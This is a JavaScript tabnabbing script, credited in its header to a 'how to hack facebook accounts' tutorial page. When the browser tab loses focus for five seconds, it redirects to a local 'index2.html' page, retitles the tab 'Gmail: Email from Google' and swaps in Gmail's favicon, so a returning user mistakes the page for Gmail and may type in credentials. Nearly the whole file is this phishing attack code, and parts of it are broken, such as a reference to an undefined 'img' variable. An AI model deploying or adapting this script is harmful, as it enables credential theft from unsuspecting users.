/*
www.101hacker.com/2011/08/how-to-hack-facebook-accounts-by.html
*/


(function(){

var TIMER = null;
var HAS_SWITCHED = false;

// Events
window.onblur = function(){
  TIMER = setTimeout(changeItUp, 5000);
}  

window.onfocus = function(){
  if(TIMER) clearTimeout(TIMER);
}

// Utils
function setTitle(text){ document.title = text; }

// This favicon object rewritten from:
// Favicon.js - Change favicon dynamically [http://ajaxify.com/run/favicon].
// Copyright (c) 2008 Michael Mahemoff. Icon updates only work in Firefox and Opera.

favicon = {
  docHead: document.getElementsByTagName("head")[0],
  set: function(url){
    this.addLink(url);
  },
  
  addLink: function(iconURL) {
    var link = document.createElement("link");
    link.type = "image/x-icon";
    link.rel = "shortcut icon";
    link.href = iconURL;
    this.removeLinkIfExists();
    this.docHead.appendChild(link);
  },

  removeLinkIfExists: function() {
    var links = this.docHead.getElementsByTagName("link");
    for (var i=0; i<links.length; i++) {
      var link = links[i];
      if (link.type=="image/x-icon" && link.rel=="shortcut icon") {
        this.docHead.removeChild(link);
        return; // Assuming only one match at most.
      }
    }
  },
  
  get: function() {
    var links = this.docHead.getElementsByTagName("link");
    for (var i=0; i<links.length; i++) {
      var link = links[i];
      if (link.type=="image/x-icon" && link.rel=="shortcut icon") {
        return link.href;
      }
    }
  }  
};  


function createShield(){
  div = document.createElement("div");
  div.style.position = "fixed";
  div.style.top = 0;
  div.style.left = 0;
  div.style.backgroundColor = "white";
  div.style.width = "100%";
  div.style.height = "100%";
  div.style.textAlign = "center";
  document.body.style.overflow = "hidden";
  
  window.location = 'index2.html'
  
  var oldTitle = document.title;
  var oldFavicon = favicon.get() || "/favicon.ico";
  
  div.appendChild(img);
  document.body.appendChild(div);
  img.onclick = function(){
    div.parentNode.removeChild(div);
    document.body.style.overflow = "auto";
    setTitle(oldTitle);  
    favicon.set(oldFavicon)
  }
  

}

function changeItUp(){
  if( HAS_SWITCHED == false ){
    createShield("https://mail.google.com");
    setTitle( "Gmail: Email from Google");    
    favicon.set("https://mail.google.com/favicon.ico");
    HAS_SWITCHED = true;    
  }
}
  
  
})();
